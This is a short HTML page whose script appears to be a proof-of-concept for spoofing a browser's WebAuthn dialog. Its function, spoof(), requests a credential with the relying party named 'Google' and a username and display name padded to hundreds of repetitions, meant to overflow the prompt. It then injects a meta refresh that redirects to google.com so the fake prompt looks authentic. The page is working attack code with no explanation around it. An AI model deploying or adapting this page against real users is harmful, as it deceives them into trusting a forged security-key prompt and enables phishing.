<!DOCTYPE html>
<html>
<head>
  <title>WebAuthn Setup</title>
</head>
<body>

<h2>Setup Security Key</h2>
<button onclick="spoof()">Setup WebAuthn</button>

<script>
function spoof() {
  // Trigger WebAuthn with long username/displayName to overflow dialog
  navigator.credentials.create({
    publicKey: {
      rp: { name: "Google" },
      user: {
        id: new Uint8Array(16),
        name: "john".repeat(500) + "@google.com",
        displayName: "John Smith ".repeat(200)
      },
      pubKeyCredParams: [{ type: "public-key", alg: -7 }],
      attestation: "direct",
      timeout: 60000,
      challenge: new Uint8Array(32).buffer
    }
  }).catch(() => {});

  // Inject meta refresh after dialog appears
  setTimeout(() => {
    var meta = document.createElement('meta');
    meta.httpEquiv = "refresh";
    meta.content = "1;url=https://www.google.com";
    document.head.appendChild(meta);

    document.body.innerHTML = '<h1 style="color:green">Redirecting to Google...</h1>';
  }, 1000);
}
</script>

</body>
</html>
